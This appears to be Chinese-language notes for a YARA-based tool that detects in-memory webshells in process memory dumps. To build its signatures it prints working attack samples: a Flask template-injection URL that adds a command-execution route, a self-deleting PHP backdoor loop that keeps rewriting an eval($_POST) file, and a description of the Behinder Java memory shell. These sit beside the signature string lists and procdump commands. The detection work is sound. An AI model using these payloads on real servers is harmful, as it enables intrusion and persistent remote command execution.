linux系统运行需要安装yara
sudo apt-get install yara

windows系统无需安装，调用yara_engine目录下的引擎

用到的模块
sys
os
tqdm
time



yara64.exe flask.yar 6196



python内存马
http://192.168.1.178:5000/test?param={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell1%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.values.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}}


http://192.168.1.178:5000/shell1?cmd=whoami


特征：
_request_ctx_stack
add_url_rule
exec
eval






java内存马
冰蝎内存马是冰蝎攻击团队研发的一种恶意木马，主要通过将恶意代码注入到目标JVM进程中来执行恶意操作，其关键特征如下：

包含ProcessBuilder、Runtime等Webshell常用的命令执行危险操作。这是冰蝎内存马的一种攻击方式，可以执行任意系统命令，从而获取系统权限。
Instrument机制。这是Java提供的一种用于分析、修改JVM进程的机制，冰蝎内存马利用该机制来隐藏自己的恶意代码。
此外，冰蝎内存马还有一些其他的特征，比如会修改被攻击JVM的类加载器，使其加载恶意代码；会通过hook技术来绕过应用的安全检测等。
特征：
ProcessBuilder
Runtime
Instrument
Injected Successfully
HttpSessionBindingListener
reflect/Constructor





php不死马
新建文件22.php

<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
while (1) {
$content = '<?php @eval($_POST["zzz"]) ?>';
file_put_contents("22.php", $content);
usleep(10000);
}
?>

特征：
ignore_user_abort
set_time_limit
unlink
file_put_contents
usleep


内存导出
system权限运行
procdump.exe -accepteula -ma java.exe java.dmp
procdump.exe -accepteula -ma php-cgi.exe php-cgi.dmp